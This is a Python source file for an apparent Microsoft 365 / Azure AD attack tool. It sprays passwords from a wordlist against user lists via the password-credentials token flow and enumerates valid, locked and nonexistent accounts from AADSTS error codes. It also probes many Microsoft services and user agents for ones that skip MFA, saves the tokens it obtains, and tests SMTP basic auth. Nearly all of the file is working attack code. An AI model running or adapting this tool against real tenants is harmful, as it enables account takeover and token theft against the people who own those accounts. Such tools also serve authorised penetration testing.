import requests
import smtplib
import json
import re
from rich import print
# from rich.table import Table
# from rich.console import Console
# import rich.box
# import textwrap

from Modules.Settings import Scopes, UserAgents
from Authentication import Token

def resource_icon(resource):
    match resource:
        case "graph":
            return "📈"
        case "management":
            return "🖥️"
        case "o365":
            return "📁"
        case "teams":
            return "💬"
        case "security center":
            return "🛡️"
        case "compliance":
            return "🕵️"
        case "key vault":
            return "🔑"
        case "storage":
            return "💾"
        case "device management":
            return "🔋"
        case "cosmos":
            return "🌌"
        case "monitor":
            return "📍"
        case "datalake":
            return "🌊"
        case "iothub":
            return "🔌"
        case "ml":
            return "🤖"
        case _:
            return "⚙️ "


# def Show(tokens, scope):      
#     table = Table(title=f"Tokens for {scope}", show_header=True, box=rich.box.HORIZONTALS)

#     if "access_token" in tokens:
#         table.add_row("\n".join(textwrap.wrap(str(tokens['access_token']).strip("\n"), width=500)))
#         table.add_row("")
#     if "refresh_token" in tokens:
#         table.add_row("\n".join(textwrap.wrap(str(tokens['refresh_token']).strip("\n"), width=500)))

#     #     print(f"\tTokens for {scope}\n{'-'*175}")

#     # if "access_token" in tokens:
#     #     print("\t{}".format(str(tokens['access_token']).strip('\n')))
#     # if "refresh_token" in tokens:
#     #     print("\t{}\n".format(str(tokens['refresh_token']).strip('\n')))

#     Console().print(table)

def MFACheck(user, password, tenant, client, usecae, endpointversion, useragent, savetokens):
    for resource, scope in Scopes.Scope.items():
        response = None

        response = Token.ResourceOwnerPasswordCredentials(user, password, tenant, client, scope, usecae, endpointversion, useragent)

        if response.status_code == 400 and re.search(".*(AADSTS50079|AADSTS50076).*", response.content.decode("utf-8")):
            print("\t", resource, resource_icon(resource), f"[bold red]MFA[/bold red]")
        elif response.status_code == 400 and re.search(".*AADSTS65002.*", response.content.decode("utf-8")):
            print("\t", resource, resource_icon(resource), f"[bold yellow]Disabled[/bold yellow]")
        elif response.status_code == 400 and re.search(".*AADSTS90002.*", response.content.decode("utf-8")):
            print("\t", resource, resource_icon(resource), f"[bold red]Tenant Does Not Exist[/bold red]")
        elif response.status_code == 200:
            print("\t", resource, resource_icon(resource), f"[bold green]SFA[/bold green]")

            tokens = json.loads(response.content.decode("utf-8"))

            if savetokens:
                Token.SaveToken(tokens, user, password, client, scope)

        elif response.status_code == 401 and re.search(".*AADSTS7000218.*", response.content.decode("utf-8")):
            print("\t", resource, resource_icon(resource), f"[bold red]Invalid client[/bold red]")
        else:
            error_data = json.loads(response.content.decode("utf-8"))
            error_code = error_data["error_description"].split(":")[0]
            print("\t", resource, resource_icon(resource), f"[bold red]Error - {error_code}[/bold red]")
        
        # Try different user agents against the O365 resource
        if resource == "o365":
            for ua_name, ua_value in UserAgents.Agent.items():

                response = Token.ResourceOwnerPasswordCredentials(user, password, tenant, client, scope, usecae, endpointversion, ua_value)

                if response.status_code == 400 and re.search(".*(AADSTS50079|AADSTS50076).*", response.content.decode("utf-8")):
                    print(f"\t\t{resource} - {ua_name} UA", resource_icon(resource), f"[bold red]MFA[/bold red]")
                elif response.status_code == 200:
                    print(f"\t\t{resource} - {ua_name} UA", resource_icon(resource), f"[bold green]SFA[/bold green]")

                    tokens = json.loads(response.content.decode("utf-8"))

                    if savetokens:
                        Token.SaveToken(tokens, user, password, client, scope)

                else:
                    print(f"\t\t{resource} - {ua_name} UA", resource_icon(resource), f"[bold red]{response.content.decode('utf-8')}[/bold red]")


# Check basic auth for SMTP
# https://redcanary.com/blog/threat-detection/bav2ResourceOwnerPasswordCredentials/
def SMTPBasicAuthCheck(user, password):
    try:
        s = smtplib.SMTP(host="smtp-mail.outlook.com", port=587)
        s.starttls()
        #s.debuglevel = 2
        s.login(user, password)
        s.close()
    except smtplib.SMTPAuthenticationError as smtpae:
        if re.search(".*SmtpClientAuthentication is disabled for the Tenant.*", smtpae.smtp_error.decode("utf-8")):
            print("\tSMTP Basic Auth", "📧", f"[bold red]Disabled[/bold red]")

        elif re.search(".*Authentication unsuccessful.*", smtpae.smtp_error.decode("utf-8")):
            print("\tSMTP Basic Auth", "📧", f"[bold red]Auth Failure[/bold red]")
        else:
            print("\tSMTP Basic Auth", "📧", f"[bold red]{smtpae.smtp_error}[/bold red]")
            

def main(userlist, passwordlist, tenant, client, scope, usecae, endpointversion, useragent, mfacheck, savetokens):

    users = userlist.read().split("\n")
    passwords = passwordlist.read().split("\n")

    if useragent == None:
        response = requests.get("http://httpbin.org/headers")

        if response.status_code == 200:
            useragent = json.loads(response.content.decode("utf-8"))["headers"]["User-Agent"]
        else:
            useragent = "python-requests/0.0.0"
        

    for user in users:
        for password in passwords:
            try:
                response = Token.ResourceOwnerPasswordCredentials(user, password, tenant, client, scope, usecae, endpointversion, useragent)

                if response.status_code == 200:
                    # table = Table("Result", "User", "Password", "Client", "Scope", "User-Agent", "Details")
                    # table.add_row("✅", user, password, client, scope, useragent, "Valid credentials")
                    # Console().print(table)
                    print("✅", user, password, client, scope, useragent, "Valid credentials")

                    tokens = json.loads(response.content.decode("utf-8"))

                    if savetokens:
                        Token.SaveToken(tokens, user, password, client, scope)
                    
                    if mfacheck:
                        MFACheck(user, password, tenant, client, usecae, endpointversion, useragent, savetokens)
                        SMTPBasicAuthCheck(user, password)

                    break
                elif response.status_code == 400 and re.search(".*AADSTS50053.*", response.content.decode('utf-8')):
                    print("🔒", user, password, client, scope, useragent, "Account locked")
                    break
                elif response.status_code == 400 and re.search(".*(AADSTS50034|AADSTS51004|AADSTS50014).*", response.content.decode("utf-8")):
                    print("❌🔍👤", user, password, client, scope, useragent, "Not a valid user")
                    break
                elif response.status_code == 400 and re.search(".*AADSTS90002.*", response.content.decode("utf-8")):
                    print("❌🔍🌐", user, password, client, scope, useragent, f"Tenant Does Not Exist")
                    break
                elif response.status_code == 400 and re.search(".*AADSTS50057.*", response.content.decode("utf-8")):
                    print("🚫", user, password, client, scope, useragent, "User account is disabled")
                    break
                elif response.status_code == 400 and re.search(".*AADSTS50076.*", response.content.decode("utf-8")):
                    print("⚔️", user, password, client, scope, useragent, f"Valid credentials found, but the {scope} service requires user to complete MFA request")

                    # start here by rotating through all the services (resources/scopes) that mfasweep rotates through and try different user agents as well when sending the requests
                    # https://learn.microsoft.com/en-us/microsoft-365/enterprise/urls-and-ip-address-ranges?view=o365-worldwide
                    # response = requests.post(url=f"https://outlook.office365.com", data=data, headers={"User-Agent": agent here (mobile, mac, etc.)})
                    # https://www.blackhillsinfosec.com/exploiting-mfa-inconsistencies-on-microsoft-services/

                    if mfacheck:
                        MFACheck(user, password, tenant, client, usecae, endpointversion, useragent, savetokens)
                        SMTPBasicAuthCheck(user, password)
                    
                    break
                elif response.status_code == 400 and re.search(".*AADSTS50126.*", response.content.decode("utf-8")):
                        print("❌", user, password, "Invalid password")
                else:
                    print(response.content.decode("utf-8"))
            except KeyboardInterrupt as ki:
                exit()